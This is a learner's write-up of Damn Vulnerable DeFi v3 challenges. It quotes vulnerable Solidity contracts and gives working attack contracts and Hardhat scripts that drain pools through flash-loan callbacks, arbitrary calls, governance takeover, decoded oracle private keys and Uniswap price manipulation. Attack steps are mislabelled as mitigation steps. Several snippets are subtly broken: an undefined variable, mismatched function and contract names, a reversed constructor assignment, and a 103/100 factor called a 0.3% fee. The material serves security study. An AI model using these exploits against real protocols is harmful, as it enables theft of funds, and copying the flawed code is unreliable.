# Damn Vulnerable Defi V3 Learnings

# 1. Unstoppable

- There are some conditions in the critical function that can be attacked by DOS(Denial of Service)
- Like here it was **flashLoan(),** where the condition…
- **Problem:**

```solidity
uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore)// @audit this condition can be attacked by DOS
            revert InvalidBalance(); // enforce ERC4626 requirement
```

- convertToShares(totalSupply)==balanceBefore and if this condition fails then the user will not be able to take Flash Loans.
- Here it's very easy for an attacker to attack a contract through a DOS attack by just transferring the “DVT” token manually to the vault address so that the condition for totalSupply≠balanceBefore will pass and hence contract will stop working.
- **Solution:**

```jsx
it('Execution', async function () {
                /** CODE YOUR SOLUTION HERE */
								// @note send a DVT token to vault address 
                await token.connect(player).transfer(vault.address,ethers.utils.parseEther("1"))
            });
```

- First I thought we have to deposit some shares to change the value of totalAssets by using ERC4626 contract but It was not like we have to manually transfer the DVT token to the vaults address which is a more secure way to attack😉

# 2. Naive Reciever

- Always check for **Access Control** of Important Functions which includes sending or receiving of tokens, ethers, etc
- In this contract, the function **flashLoan()** didn't have any Access Control which meant that anyone could call the function.
- **Problem:**

```solidity
function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount, // @audit amount is not been checked -> no limitation of Amount
        bytes calldata data
    ) external returns (bool) {
        // @audit anyone can call this function -> no Access Control
        // @note this means we first deploy a contract of attacker and call this function multiple times to drain funds

        if (token != ETH) revert UnsupportedCurrency();

        uint256 balanceBefore = address(this).balance; //@note contract balance which is 1000 ether
```

- So we can see that, the attacker can drain the funds of the receiver by calling this function multiple times like 10 times in this case because the receiver has a balance of 10 ETH which we have to drain by calling the function 10 times and every time attacker calls the function, 1ETH is drained from receiver account as **FEE.**
- **Solution:**
- **Attacker.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// @note we import NaiveReceiverLenderPool for flashLoan function
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Attacker{ 
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 public constant amount = 100;
    NaiveReceiverLenderPool public pool;
    IERC3156FlashBorrower public receiver;
    function addReceiever(IERC3156FlashBorrower _recevier)public{
        receiver = _recevier;
    }

    function addPool(NaiveReceiverLenderPool _pool)public{
        pool = _pool;
    }

    fallback() payable external{
        for(uint i=0;i<10;i++)
        {
            pool.flashLoan(receiver,ETH,amount,data);
        }
    }
}
```

- Since we sendTransaction() to the attacker’s address and we can see that there is no receive function so our fallback() function is called where we call flashLoan() 10 times to drain funds.
- **naive-receiver-challenge.js**

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let Attacker = await ethers.getContractFactory("Attacker");
        let attacker = await Attacker.deploy();
        await attacker.addReceiver(receiver.address);
        await attacker.addPool(pool.address);
        await player.sendTransaction({
          to: attacker.address, 
          gasLimit: 30000000,
        })
    });
```

- We deploy the attacker’s contract and send the Transaction to the attacker’s address.

# 3. Truster

- Please look for parameters in the function what they are **expected** to do and what they **really do** OR get more information about how the parameter of the **function works till its root**.
- Here in this problem, we see that there is a call made to target through **functionCall(data)** which makes the call to any **arbitrary function through the TrusterLenderPool** with any checking/require statements.
- Problem:

```solidity
 **function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
        returns (bool)
    // @audit there is no check for zero amount entered??
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data); // @audit executes data parameter on target without any check
        // imp @note above function takes this call to other contract in Address.sol where the function callWithValue
        // which does target.call to the this TrusterLenderPool contract , so basically if we allow/approve attacker.address
        // to use totalPoolBalance of this contract by using/encoding the function approve and passing them through target.functionCall(data)-> through data we will pass because it executes data parameter without any check

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }**
```

- First, we enter amount=0 as there is no check for zero amount and we don't have to repay anything back to flashLoan();
- There is a data byte that directly executes the data call from the target
- We have to make the target call the approve function by constructing data payload to make TrusterLenderPool call the DVT to approve method `bytes memory data  = abi.encodeWithSignature(”approve(address,uint256)”,attacker.address,poolBalance);`

### Let's Understand the attack stepwise:

1. We enter ******************amount=0****************** while calling flashLoan() as there is no check for that.
2. Then we pass ************************************approve function************************************ through **abi.encodeFunctionSignature(”approve(address attacker, uint256 amount)”)** and store in the variable ********data********.
3. Then we pass this **data** variable by calling **pool.flashLoan(0,,data,);**
4. Then we call the **token.transferFrom()** function to transfer all the tokens to the attacker’s address.
- Solution:

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION   HERE */
        let ABI = ["function approve(address to,uint256 amount)"];
        let iface = new ethers.utils.Interface(ABI);
        const data = iface.encodeFunctionData("approve",[
            player.address,
            TOKENS_IN_POOL,
        ])
        await pool.flashLoan(0,player.address,token.address,data);
        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);
    });
```

- **encodeFunctionData is an ether JS v5 way to encode through ABI and interface**

# 4. Side Entrance

- Similar to the above Truster in this problem arbitrary call was made to a function that did not contain any code and it was **external payable** so we can write an attacker contract in which we can call another function that was already in the main contract, to malfunction and send all funds to attacker’s address.
- Here in the ******************************SideEntranceLenderPool.sol****************************** there is an flashLoan() function that calls an execute function which is an empty external payable function that can be modified to call the deposit function with the amount = poolBalance that is 1000 ETH and after that, we call ****************withdraw()**************** function, and transfer amount to **msg.sender** that is attacker’s address.
- **Problem:**

```solidity
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value; //@audit overflow/underflow chances
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        // @audit what will happen if we call withdraw multiple times?
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender]; //@audit first deleted from mapping no problem
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        // @audit amount not checked for ZERO
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); //@audit yes this call the execute function which is payable and can be modified and we can call deposit through that function with poolBalance amount

        if (address(this).balance < balanceBefore) revert RepayFailed();
    }
```

- **Solution:**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//import "solady/src/utils/SafeTransferLib.sol";

contract IFlashLoanEtherReceiver{

    address payable public pool;
    uint256 public amount;

    constructor(address payable _pool)
    {
        pool = _pool;
        amount = pool.balance;
    }
    //We here call flashLoan with the amount of poolBalance
    function hackLoan() public{
        (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));

        require(success,"Failed Hack Loan");
    }
    //Here we call the deposit function inside to execute as our flashLoan calls execute function inside itself
    function execute() external payable{
        (bool success,) = pool.call{value:amount}(abi.encodeWithSignature("deposit()"));
        require(success,"Failed Executed Deposit");
    }
    //After depositing we call withdraw function   
    function hackWithdraw() public{
        (bool success,) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(success,"Failed Hack Withdraw");
        payable(msg.sender).transfer(amount);
    }      
    receive() external payable{}   
}
```

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const attackContract = await ethers.getContractFactory("contracts/side-entrance/IFlashLoanEtherReceiver.sol:IFlashLoanEtherReceiver");
        const attacker = await attackContract.deploy(pool.address);
        await attacker.hackLoan();
        await attacker.connect(player).hackWithdraw();
    });
```

1. In the **`SideEntranceLenderPool`** contract, there is a potential for overflow or underflow in the **`deposit`** function. The **`balances[msg.sender] += msg.value`** operation is unchecked, which means it does not handle potential overflow or underflow issues.
2. The behavior of calling the **`withdraw`** function multiple times is not specified in the code. It may result in multiple withdrawals of the same amount, reducing the balance of the caller each time.
3. In the **`flashLoan`** function, the **`amount`** parameter is not checked for zero value, allowing flash loans of zero amounts to be executed.
4. The **`execute`** function in the **`IFlashLoanEtherReceiver`** contract calls the **`deposit`** function, effectively allowing the flash loan contract to call the **`deposit`** function within itself.
5. The **`hackLoan`** function in the **`IFlashLoanEtherReceiver`** contract calls the **`flashLoan`** function with the **`amount`** of the pool balance.
6. The **`hackWithdraw`** function in the **`IFlashLoanEtherReceiver`** contract calls the **`withdraw`** function and transfers the **`amount`** to the **`msg.sender`**.
7. The **`receive`** function in the **`IFlashLoanEtherReceiver`** contract is a fallback function that allows the contract to receive Ether.

# 5. The Rewarder

- **Problem:**

```solidity
function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);
				//@audit Problem here
        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
```

1. Here above function flashLoan makes a call to receiveFlashLoan(uint256) which leads to a vulnerable call to nothing because there is no function known as receiveFlashLoan in the whole contract and that's a Vulnerability here.
2. Now to attack it we just make a call to flashLoan function from Attack Contract and implement the receiveFlashLoan function in our own style! 
- **Solution:**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract attackReward{

    uint256 public amount = 1000000 ether;
    address public player;
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewarderPool;
    RewardToken public rewardToken;

    constructor(FlashLoanerPool _pool,DamnValuableToken _token,TheRewarderPool _rewarderPool,RewardToken _rewardToken,address _player)
    {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        _player = player;
    }
    // and as fallback gets called we approve rewardPool to use the balance amount of token and then
    // rewardPool deposit balance into their pool and withdraw back.
    function receiveFlashLoan(uint256 _amount) public{

        token.approve(address(rewarderPool),_amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        uint256 playerReward = rewardToken.balanceOf(address(this));
        // we will send the flashLoan amount back to it so that the flashLoan doesnt get reverted
        rewardToken
        .transfer(player,playerReward);
        token.transfer(address(pool),_amount);
    }
    // 1st we call attack so that flashLoan gets executed and hence we know flashLoan has an aribtary call which
    // will be directed to receiveFlashLoan
    function callFlash() public{
        pool.flashLoan(amount);
    }

}
```

1. Call flashLoan()
2. Modify receiveFlashLoan to hack reward by withdrawing and sending the amount back to the pool so that our call doesn't get reverted.
3. Transfer the reward to your account.

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Attacker = await ethers.getContractFactory(
            "contracts/the-rewarder/Attacker.sol:Attacker"
          );
          const attacker = await Attacker.deploy(
            flashLoanPool.address,
            rewarderPool.address,
            rewardToken.address,
            liquidityToken.address,
            player.address
          );
          await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]);
          await liquidityToken.approve(rewarderPool.address, 1n * 10n * 17n);
      
          await attacker.getLoan();
    });
```

# 6. Selfie

**************Problem:**************

```solidity
function emergencyExit(address receiver) external onlyGovernance {
        //@audit no use of modifier because asset token and governance token are same token
        //@audit hack function
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
```

- The **`emergencyExit`** function is called to drain funds.
- The **`flashLoan`** function is used to initiate the attack by sending data for draining funds.
- The execution of **`emergencyFunds`** is delayed until the attacker can execute the action.
- The **`executeAction`** function is called with the parameter **`data`** set to **`emergencyExit`**.
- ******************Solution:******************

### Steps of Mitigation

1. As we know that in the function flashLoan there is an arbitrary call made to the onFlashLoan which returns bytes32 and its value is already known, so we can manipulate the function to do something else but return the expected value to pass flashLoan.

2. So we have a function called as emergencyExit which has a modifier onlyGovernance but it's of no use because our asset token and governance token are the same so we have power over it.
so first we call flashLoan in which we will send `data = abi.encodeFunctionSignature("function emergencyExit(address)")` so we can drain funds.

3. But calling of emergencyFunds will happen after 2 days of queueing action  when the attacker is able to executeAction its parameter data will have value as emergencyExit;

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
/*
Steps of mitigation:
 
As we know that in function flashLoan there an arbitary call made to the onFlashLoan which returns bytes32 
and its value is already known, so we can manipulate the function to do something else but return the expected value to pass
flashLoan.
So we have an function called as emergencyExit which has an modifier onlyGovernance but its off no use because our asset
token and goverence token are the same so we have an power over it.
so first we call flashLoan in which we will send data = abi.encodeFunctionSignature("function emergencyExit(address)") so we can drain funds

 but calling of emergencyFunds will happen after 2 days of queueing action  when attacker is able to executeAction its parameter data
 will have value as emeregencyExit;
 
 */

contract selfieAttacker is IERC3156FlashBorrower{

    SelfiePool public immutable pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address public player;
    uint256 public amount = 1500000 ether;//1.5Million

    constructor(SelfiePool _pool,SimpleGovernance _governance,DamnValuableTokenSnapshot _token,address _player){

        pool = _pool;
        governance = _governance;
        token = _token;
        player = _player;
    }
    function getLoan()public{
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);

        pool.flashLoan(IERC3156FlashBorrower(address(this)),address(token),amount,data);
    }

    function onFlashLoan(address,address,uint256 _amount,uint256,bytes calldata data) external returns(bytes32){

        require(token.balanceOf(address(this))==1500000 ether,"Token Balance Failed");
        uint256 id = token.snapshot();
        require(id==2,"Failed ID");
        governance.queueAction(address(pool),0,data);
        uint cnt = governance.getActionCounter();
        require(cnt==2,"Failed Counter");
        token.approve(address(pool),_amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }
    function execute() public{
        governance.executeAction(1);
    }

}
```

# 7. Compromised

- Read the contract for at least 3 hours and after that found out the answer was in the problem statement where a code was provided.

![Untitled](Damn%20Vulnerable%20Defi%20V3%20Learnings%207135a5ed24664955b7a010870f64e317/Untitled.png)

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        let string,key1,key2,info;
        // converted hex to utf-8 and then encode utf-8 using base64 to get the private key to source addresses
        info = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
        string = Buffer.from(info.split(" ").join(""),"hex").toString("utf-8");
        key1 = Buffer.from(string,"base64").toString("utf-8");
        console.log(key1);

        info = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
        string = Buffer.from(info.split(" ").join(""),"hex").toString("utf-8");
        key2 = Buffer.from(string,"base64").toString("utf-8");
        console.log(key2);

        // create signer for malicious oracles and post new price using function postPrice()
        const NEW_PRICE = 1n * 10n ** 16n
        const signer1 = new ethers.Wallet(key1,ethers.provider);
        await oracle.connect(signer1).postPrice("DVNFT",NEW_PRICE);
        const signer2 = new ethers.Wallet(key2,ethers.provider);
        await oracle.connect(signer2).postPrice("DVNFT",NEW_PRICE);

        await exchange.connect(player).buyOne({value:NEW_PRICE});

        await oracle.connect(signer1).postPrice("DVNFT",INITIAL_NFT_PRICE+NEW_PRICE);
        await oracle.connect(signer2).postPrice("DVNFT",INITIAL_NFT_PRICE+NEW_PRICE);

        await nftToken.connect(player).approve(exchange.address,0);
        // now we sell as we have increased the price of DVNFT
        await exchange.connect(player).sellOne(0);

        // reset back to original price
        await oracle.connect(signer1).postPrice("DVNFT",INITIAL_NFT_PRICE);
        await oracle.connect(signer2).postPrice("DVNFT",INITIAL_NFT_PRICE);
    });
```

- The private keys for the source addresses are decoded from hex and base64.
- The signer instances are created for the malicious oracles using the decoded private keys.
- The **`postPrice`** function is called for the oracles to post a new price for the "DVNFT" token.
- The **`buyOne`** function is called to simulate the purchase of one "DVNFT" token at the new price.
- The **`postPrice`** function is called again to update the price of the "DVNFT" token.
- Approval is given for the exchange to manage the "DVNFT" token with ID 0.
- The **`sellOne`** function is called to sell one "DVNFT" token at an increased price.
- The **`postPrice`** function is called once more to reset the price back to its original value.

# 8. Puppet

- The **`calculateDepositRequired`** function calculates the required deposit amount based on the **`amount`** parameter, the result of **`_computeOraclePrice()`**, and the **`DEPOSIT_FACTOR`**. This function multiplies the **`amount`** by the **`_computeOraclePrice()`** and the **`DEPOSIT_FACTOR`**, and then divides it by **`10 ** 18`**.
- The **`_computeOraclePrice`** function calculates the price of the token in wei based on the balance of the **`uniswapPair`** and the balance of the token held in the **`uniswapPair`**. It multiplies the **`uniswapPair.balance`** by **`10 ** 18`** and then divides it by **`token.balanceOf(uniswapPair)`**.
- These calculations suggest that the required deposit amount depends on the result of **`_computeOraclePrice()`**, which is derived from the balances of the Uniswap pair and the token held in the pair. Manipulating the Uniswap pair balance could potentially impact the **`calculateDepositRequired`** function and affect the borrowing mechanism in the contract.
- ********Problem:********

```solidity
function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return
            (uniswapPair.balance * (10 ** 18)) / token.balanceOf(uniswapPair); // @audit so basically if we decrease the value uniswapPair balance to manipulate price of computeOraclePrice will help attacker to borrow or steal tokens at very low price
        // note breaking the rule that one DVT token will be worth 1 ETH!
    }
}
```

- **Solution:**

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";

contract puppetAttack{

    uint256 amount = 1000 ether;
    // as we assume it is 1:1 ratio 1DVT for 1ETH
    uint256 tokenAmount = 100000 ether;

    PuppetPool public pool;
    IUniswapExchange public exchange;
    DamnValuableToken public token;
    address public player;

    constructor(address _exchange,address _pool,address _token,address _player)
    payable
    {   
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
        token = DamnValuableToken(_token);
        player = _player;
    }

    function swap() public{

        // approve exchange
        token.approve(address(exchange),amount);
        // converts token to eth
        exchange.tokenToEthSwapInput(amount, 1, block.timestamp + 5000);
        // now deposit with 20ETH value
        pool.borrow{value:20 ether,gas:1000000}(tokenAmount,player);
    }
    receive() external payable{}
}
```

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /*steps of mitigation
        1. Deposit 1000 token in uniswap pool and get ETH in return and decrease the value of tokens
        -> Before -> Uniswap Pool Token Amt:10 and ETH:10 ETH
        -> After -> Uniswap Pool Token Amt:1010 and ETH:0.98 ETH
        2. Now as we lowered the balance of Uniswap Pool we borrow all tokens by depositing 20 ETH.
        3. After that we will again borrow our tokens back from Uniswap Pool and reset the balance of Uniswap Pool 
        */
       let attack = await ethers.getContractFactory("puppetAttack");
       let attacker = await attack.deploy(
        uniswapExchange.address,
        lendingPool.address,
        token.address,
        player.address,
        {value:ethers.utils.parseEther("15")}
       )
        // send the Initial balance to attacker address
       await token.connect(player).transfer(attacker.address,PLAYER_INITIAL_TOKEN_BALANCE);
       // then call swap to sweep all balance
       await attacker.swap();

    });
```

- Check out the Comments for Understanding the Mitigation Steps!

# 9. Puppet V2

- Very Similar to 8. ************Puppet************
- **Steps of Mitigation:**
1. First, deposit the initial token balance into UniswapV2Pool to drop the value of tokens and reduce the amount of WETH.
2. Then, convert ETH to WETH, and our balance becomes approximately 30 WETH.
3. As for now, the price of tokens has dropped. Now, we can exchange tokens with WETH and get 1 million tokens for under 30 WETH.
4. We win!
- **********Solution:**********

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /*
        Steps of Mitigation
        1. First we deposit intial token balance into UniswapV2Pool to drop down the value of tokens and reduce the amount of WETH
        2. Then we convert ETH to WETH and our balance becomes near about 30 WETH
        3. As for now the price of Tokens has been dropped down now we can exchange it with WETH and get 1 Million token for under 30WETH
        4. Hehehehe we win
        */
        let amountIn;
    amountIn = PLAYER_INITIAL_TOKEN_BALANCE;
    await token.connect(player).approve(uniswapRouter.address, amountIn);
    let time = await helpers.time.latest();
    await uniswapRouter
      .connect(player)
      .swapExactTokensForETH(
        amountIn,
        1,
        [token.address, weth.address],
        player.address,
        time + 5000
      );

    await weth
      .connect(player)
      .deposit({ value: ethers.utils.parseEther("29.5") });

    await weth
      .connect(player)
      .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
      
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```

# 10. Free-Rider

## Steps of Mitigation

1. We have a **low Ether** balance, so we simply need more ETH to buy NFTs.
2. To acquire Ether, we can use the **swap() function** of **UniswapV2Pair.** First, we obtain WETH, and then we invoke a **withdraw() function** from the WETH.sol contract to receive the desired ETH.
3. Once we have **withdrawn** the ETH, we proceed to purchase all six NFTs for a fixed price of **15 Ether**.
4. By buying these NFTs, our balance increases by approximately **90 ETH** since we receive a **refund** of 15 ETH for each NFT purchased. Additionally, we have deposited the required amount of WETH as collateral, as per the terms specified by the WETH contract.
5. After making the deposit, we transfer the WETH to the WETH contract to ensure that the repayment process does not **encounter any errors.**
6. At this point, everything is in order, and the final step is to send all the acquired NFTs to the **devContract** in order to claim our BOUNTY!

### ****************************Attacker Contract:****************************

```solidity
//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "./FreeRiderNFTMarketplace.sol";
import "solmate/src/tokens/WETH.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackContract is IUniswapV2Callee,IERC721Receiver{

    IUniswapV2Pair public pair;
    FreeRiderNFTMarketplace public marketplace;
    WETH public wEth;
    FreeRiderRecovery public recovery;
    DamnValuableNFT public nft;
    address public player;
    uint256 public amount = 15 ether;
    uint256[] public tokenIds = [0,1,2,3,4,5];

    constructor(address _pair, address payable _marketplace,address payable _wEth, address _recovery, address _nft, address _player)payable{

        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        wEth = WETH(_wEth);
        recovery = FreeRiderRecovery(_recovery);
        nft = DamnValuableNFT(_nft);
        player = _player;

    }

    function flashSwap() public{
        bytes memory data = abi.encode(amount);

        pair.swap(amount,0,address(this),data);
        
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {

        wEth.withdraw(amount0);
        
        marketplace.buyMany{value: amount0}(tokenIds);// arguement is array of tokenIds

        uint tokenFee = (amount0*103)/100; // adding 0.3% fees 
        wEth.deposit{value: tokenFee}();// we can also pass 15.1 ether instead of tokenFee cuz its the same

       wEth.transfer(msg.sender,tokenFee); 
    }

    function transferNft(uint tokenId)public{
        bytes memory data = abi.encode(player);// this is done because in the function `function onERC721Received()` it fetches address of *reciepent* by decoding the data.
        
        nft.safeTransferFrom(address(this),address(recovery),tokenId,data);
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;// this need to be returned
    }

    receive() external payable {}
}
```

```jsx
it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        
    const Attacker = await ethers.getContractFactory("AttackContract");

    const attack = await Attacker.deploy(
      uniswapPair.address,
      marketplace.address,
      weth.address,
      devsContract.address,
      nft.address,
      player.address,
      { value: ethers.utils.parseEther("0.05") }
    );
    
    await attack.flashSwap();
    for (i = 0; i < 6; i++) {
      await attack.connect(player).transferNft(i);
    }
    });
```

## Exploits:

![Untitled](Damn%20Vulnerable%20Defi%20V3%20Learnings%207135a5ed24664955b7a010870f64e317/Untitled%201.png)

![Untitled](Damn%20Vulnerable%20Defi%20V3%20Learnings%207135a5ed24664955b7a010870f64e317/Untitled%202.png)

- **Note:** This challenge is excellent for learning new things I got introduced to the uniswapV2Pair swap() function then I studied how it works and how it calls the unsiwapV2Call() function.
